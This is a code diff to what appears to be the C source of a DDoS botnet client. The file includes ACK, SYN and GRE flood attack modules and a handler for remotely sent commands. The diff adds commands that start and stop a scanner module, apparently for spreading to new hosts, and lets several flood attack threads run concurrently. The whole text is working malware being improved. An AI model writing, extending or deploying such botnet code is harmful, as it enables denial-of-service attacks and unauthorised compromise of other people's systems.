@@ -17,6 +17,7 @@
 
 #include "headers/attack_params.h"
 #include "headers/manager.h"
+#include "headers/scanner.h"
 
 #include "methods/ack_attack.h"
 #include "methods/syn_attack.h"
@@ -84,7 +85,7 @@ void cleanup_attack_threads() {
     pthread_mutex_unlock(&thread_mutex);
 
     sleep(1);
-    
+
     pthread_mutex_lock(&thread_mutex);
     for (int i = 0; i < MAX_THREADS; i++) {
         if (thread_states[i].thread != 0) {
@@ -99,6 +100,44 @@ void cleanup_attack_threads() {
         }
     }
     pthread_mutex_unlock(&thread_mutex);
+}
+
+static void reap_finished_threads() {
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (thread_states[i].thread != 0 && thread_states[i].active) {
+            if (thread_states[i].type == 0) {
+                attack_params *ap = (attack_params*)thread_states[i].params;
+                if (ap && !ap->active) {
+                    pthread_join(thread_states[i].thread, NULL);
+                    free(thread_states[i].params);
+                    thread_states[i].thread = 0;
+                    thread_states[i].params = NULL;
+                    thread_states[i].active = 0;
+                    thread_states[i].type = -1;
+                }
+            } else if (thread_states[i].type == 1) {
+                gre_attack_params *gp = (gre_attack_params*)thread_states[i].params;
+                if (gp && !gp->active) {
+                    pthread_join(thread_states[i].thread, NULL);
+                    free(thread_states[i].params);
+                    thread_states[i].thread = 0;
+                    thread_states[i].params = NULL;
+                    thread_states[i].active = 0;
+                    thread_states[i].type = -1;
+                }
+            }
+        }
+    }
+}
+
+static int find_free_slot() {
+    reap_finished_threads();
+    for (int i = 0; i < MAX_THREADS; i++) {
+        if (!thread_states[i].active && thread_states[i].thread == 0) {
+            return i;
+        }
+    }
+    return -1;
 }
 
 attack_params* create_attack_params(const char *ip, uint16_t port, int duration, int psize, int srcport, char *payload) {
@@ -158,6 +197,16 @@ void handle_command(char* command, int sock) {
         return;
     }
 
+    if (strncmp(command, "scan_on", 7) == 0) {
+        scanner_start(sock);
+        return;
+    }
+
+    if (strncmp(command, "scan_off", 8) == 0) {
+        scanner_stop();
+        return;
+    }
+
     const AttackCommand *found_cmd = NULL;
     int num_commands = sizeof(attack_commands) / sizeof(attack_commands[0]);
 
@@ -203,10 +252,15 @@ void handle_command(char* command, int sock) {
             }
         }
         
-        cleanup_attack_threads();
-        
         pthread_mutex_lock(&thread_mutex);
-        
+
+        int slot = find_free_slot();
+        if (slot < 0) {
+            pthread_mutex_unlock(&thread_mutex);
+            if (payload) free(payload);
+            return;
+        }
+
         void* params = NULL;
         int param_type_idx = -1;
 
@@ -227,15 +281,15 @@ void handle_command(char* command, int sock) {
             return;
         }
 
-        int ret = pthread_create(&thread_states[0].thread, NULL, found_cmd->handler, params);
+        int ret = pthread_create(&thread_states[slot].thread, NULL, found_cmd->handler, params);
         if (ret != 0) {
             free(params);
         } else {
-            thread_states[0].params = params;
-            thread_states[0].active = 1;
-            thread_states[0].type = param_type_idx;
+            thread_states[slot].params = params;
+            thread_states[slot].active = 1;
+            thread_states[slot].type = param_type_idx;
         }
-        
+
         pthread_mutex_unlock(&thread_mutex);
     }
 }
